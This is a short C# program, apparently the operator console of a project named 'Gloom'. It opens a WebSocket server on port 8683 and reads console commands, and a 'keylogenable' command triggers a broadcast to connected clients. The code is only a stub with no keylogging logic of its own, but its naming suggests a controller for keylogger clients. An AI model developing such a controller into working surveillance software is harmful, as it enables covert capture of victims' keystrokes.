namespace Gloom
{
	internal class Program
	{
		private MessageServer server;

		static void Main(string[] args)
		{
			new Program(new MessageServer("ws://0.0.0.0:8683"));
		}

		public Program(MessageServer server)
		{
			this.server = server;
			CommandLoop();
		}

		private void CommandLoop()
		{
			while (true)
			{
				string cmd = Console.ReadLine();
				if (cmd.StartsWith("keylogenable"))
				{
					server.TestAll();
				}
			}
		}
	}
}